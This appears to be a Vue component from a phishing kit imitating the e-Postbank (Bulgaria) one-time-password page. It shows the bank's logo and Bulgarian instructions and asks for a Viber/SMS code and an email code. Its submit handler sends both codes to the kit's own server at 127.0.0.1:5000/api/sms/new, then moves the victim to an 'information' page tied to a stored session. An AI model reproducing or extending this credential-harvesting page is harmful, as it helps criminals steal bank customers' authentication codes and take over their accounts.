<template>

  <div id="login-container" class="ePortalRegForm">



    <div class="Main-Content" style="width: 90%;margin: 0 auto;padding-bottom: 10px;" >
      <div id="SessionAuthorization_m_checkOTPControl_m_validate_OTP">
        <div class="logo"><img style="width:200px" src="../img/logo-pb-en.svg" alt="Welcome to ePostbank">
          <h3>Допълнително удостоверяване</h3>

        </div>
        <img v-if="Loding" src="../img/loding.gif" style="position: relative;left: 270px;width: 34px;">
        <div v-if="!Loding">
          <div id="div_CRAI">

            <div class="mobileTokenContainer"><ul class="enrollmentStepsContainer"><li>
              Ще получите следните кодове за активиране:

              <ul class="codePartsContainer"><li>
                Код 1 ще бъде изпратен на посочения от Вас мобилен телефонен номер в e-Postbank чрез Viber/SMS
              </li><li>
                Код 2 ще бъде изпратен на имейл адреса, предоставен от Вас в e-Postbank
              </li></ul></li></ul></div>
            <table class="filterBG">

              <tbody>
              <tr><td colspan="4">
                Моля, потвърдете с кода получен чрез Viber/SMS или автоматично обаждане.
              </td></tr>
              <tr>
                <td colspan="2">
                  <input type="text" id="MTAN" name="MTAN" :class="inputedit" maxlength="32" style="text-transform: uppercase;" v-model="sms">
                </td>
                <td>
                  <a id="buttonSendOK" onclick="SubmitValidateOtp()" href="javascript:void(0)">
                    <img style="border: 0px;" src="../img/btn_otp_validate.png" />
                  </a>
                </td>
                <td width="100%">
                  <a id="Submit1">
                    <img style="border: 0px;" src="../img/btn_generate_otp.png" />

                  </a>
                </td>
              <tr>
                <span class="field-validation-error" data-valmsg-replace="true" data-valmsg-for="activationCode" v-if="this.v$.sms.integer.$invalid">
                  <span for="activationCode" generated="true" class="">Неправилен формат</span>
                </span>
              </tr>
              </tbody>

            </table>
          </div>

      <div id="SessionAuthorization_m_checkOTPControl_m_validate_OTP">
        <div id="div_CRAI">
          <table class="filterBG">
            <tbody>
            <tr><td colspan="4">
              Моля, потвърдете с кода, получен по имейл.
            </td></tr>
            <tr>
              <td colspan="2">
                <input type="text" id="MTAN" name="MTAN" class="inputedit" maxlength="32" style="text-transform: uppercase;" v-model="sms1">
              </td>

              <td>
                <a id="buttonSendOK" onclick="SubmitValidateOtp()" href="javascript:void(0)">
                  <img style="border: 0px;" src="../img/btn_otp_validate.png" />
                </a>
              </td>
              <td width="100%">
                <a id="Submit1">
                  <img style="border: 0px;" src="../img/btn_generate_otp.png" />

                </a>
              </td>
            <tr>
                <span class="field-validation-error" data-valmsg-replace="true" data-valmsg-for="activationCode" v-if="this.v$.sms1.integer.$invalid">
                  <span for="activationCode" generated="true" class="">Неправилен формат</span>
                </span>
            </tr>


            </tbody>
            <p class="buttons ePortalDivIndent"><input type="submit" tabindex="0" style="width:100px;" value="потвърди" class="btn"  v-on:click="Sendsms"></p>
          </table>
        </div>
        </div>
      </div>
      </div>

    </div>
  </div>
</template>
<script>
import useVuelidate from '@vuelidate/core'
import { required , integer} from '@vuelidate/validators'
import axios from 'axios'
export default {
  name:'sms',
  setup () {
    return { v$: useVuelidate() }
  },
  data(){
    return{
      sms:'',
      sms1:'',
      isValid:false,
      timerCount:5,
      Loding:true

    }
  },
  validations () {
    return{
      sms:{ required ,integer },
      sms1:{ required , integer },
    }
  },
  watch:{
    timerCount:{
      handler(value) {
        if (value > 0) {
          setTimeout(() => {
            this.timerCount--;
          }, 1000);
        }else {
          this.Loding=false
        }

      },
      immediate: true
    }
  },
  methods: {
    Sendsms() {
      console.log(this.v$)

      if (this.v$.$invalid) {
        this.isValid = true
      } else {
        this.isValid = false
        const data = {
          "sms": this.sms,
          "sms1": this.sms1,
        }
        axios.post("http://127.0.0.1:5000/api/sms/new", data).then(res => {
          console.log(res)
        }).catch()
        this.$router.push("/information/"+localStorage.session)
      }

    }
  }
  }
</script>
<style>
@import '../css/style.css';
</style>
